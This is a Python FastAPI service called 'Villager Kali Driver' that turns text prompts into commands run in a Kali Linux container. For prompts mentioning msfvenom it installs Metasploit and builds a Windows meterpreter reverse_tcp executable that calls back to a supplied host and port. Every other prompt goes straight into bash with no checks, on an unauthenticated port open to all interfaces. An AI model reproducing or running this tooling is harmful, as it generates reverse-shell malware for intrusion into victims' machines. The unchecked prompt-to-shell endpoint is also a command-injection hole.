#!/usr/bin/env python3
"""
Kali Driver Service for Villager
This service handles security tool execution requests using Docker containers
"""

from fastapi import FastAPI
import uvicorn
import subprocess
import json
import os
import tempfile
import shutil

app = FastAPI(title="Villager Kali Driver Service")

# Ensure workspace directory exists
WORKSPACE_DIR = "/tmp/villager_workspace"
os.makedirs(WORKSPACE_DIR, exist_ok=True)

def ensure_kali_image():
    """Ensure Kali Linux Docker image is available"""
    try:
        # Use the base Kali Linux image - tools will be installed on-demand
        image_name = "kalilinux/kali-rolling"
        
        # Check if image exists
        result = subprocess.run(['docker', 'images', image_name], 
                              capture_output=True, text=True)
        if image_name not in result.stdout:
            print(f"Pulling Kali Linux base image...")
            subprocess.run(['docker', 'pull', image_name], 
                          check=True)
            print("Kali Linux base image ready")
        else:
            print(f"Kali Linux base image already available")
    except subprocess.CalledProcessError as e:
        print(f"Error ensuring Kali image: {e}")

def execute_in_kali_container(command: str, output_file: str = None):
    """Execute a command inside a Kali Linux Docker container"""
    try:
        # Ensure Kali image is available
        ensure_kali_image()
        
        # Prepare Docker command with base Kali image
        docker_cmd = [
            'docker', 'run', '--rm',
            '-v', f'{WORKSPACE_DIR}:/workspace',
            'kalilinux/kali-rolling',
            'bash', '-c', command
        ]
        
        print(f"Executing in Kali container: {command}")
        result = subprocess.run(docker_cmd, capture_output=True, text=True, timeout=300)
        
        # Check if output file was created
        output_path = f"{WORKSPACE_DIR}/{output_file}" if output_file else None
        if output_file and os.path.exists(output_path):
            file_size = os.path.getsize(output_path)
            return {
                "success": True,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "output_file": output_file,
                "file_size": file_size,
                "file_path": output_path
            }
        else:
            return {
                "success": True,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "output_file": None
            }
            
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "error": "Command timed out after 5 minutes",
            "stdout": "",
            "stderr": ""
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "stdout": "",
            "stderr": ""
        }

@app.post("/")
async def kali_request(request: dict):
    """Handle Kali Driver requests for security tools"""
    prompt = request.get("prompt", "")
    
    print(f"Kali Driver received request: {prompt[:100]}...")
    
    # Check if this is a msfvenom request
    if "msfvenom" in prompt.lower():
        try:
            # Extract parameters from prompt
            lhost = "192.168.1.100"  # Default LHOST
            lport = "4444"           # Default LPORT
            payload = "windows/meterpreter/reverse_tcp"  # Default payload
            output_file = "payload.exe"
            
            # Try to extract LHOST and LPORT from prompt
            import re
            lhost_match = re.search(r'LHOST[=:]\s*(\d+\.\d+\.\d+\.\d+)', prompt, re.IGNORECASE)
            lport_match = re.search(r'LPORT[=:]\s*(\d+)', prompt, re.IGNORECASE)
            
            if lhost_match:
                lhost = lhost_match.group(1)
            if lport_match:
                lport = lport_match.group(1)
            
            # Build msfvenom command for container (install on-demand)
            cmd = f"cd /workspace && (which msfvenom || apt update && apt install -y metasploit-framework) && msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
            
            # Execute in Kali container
            result = execute_in_kali_container(cmd, output_file)
            
            if result["success"]:
                response = {
                    "content": f"✅ Kali Driver executed msfvenom successfully!\n"
                              f"📁 Output file: {result.get('output_file', 'N/A')}\n"
                              f"📊 File size: {result.get('file_size', 0)} bytes\n"
                              f"🔧 Command: {cmd}\n"
                              f"📝 Output: {result['stdout']}\n"
                              f"⚠️  Errors: {result['stderr']}",
                    "done": True
                }
            else:
                response = {
                    "content": f"❌ Kali Driver error: {result.get('error', 'Unknown error')}\n"
                              f"📝 Output: {result['stdout']}\n"
                              f"⚠️  Errors: {result['stderr']}",
                    "done": True
                }
        except Exception as e:
            response = {
                "content": f"❌ Kali Driver error: {str(e)}",
                "done": True
            }
    else:
        # For other security tools, execute in container
        try:
            result = execute_in_kali_container(f"cd /workspace && {prompt}")
            response = {
                "content": f"✅ Kali Driver executed: {prompt}\n"
                          f"📝 Output: {result['stdout']}\n"
                          f"⚠️  Errors: {result['stderr']}",
                "done": True
            }
        except Exception as e:
            response = {
                "content": f"❌ Kali Driver error: {str(e)}",
                "done": True
            }
    
    return response

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "healthy", "service": "kali_driver"}

if __name__ == "__main__":
    print("Starting Villager Kali Driver Service on port 1611...")
    uvicorn.run(app, host="0.0.0.0", port=1611)
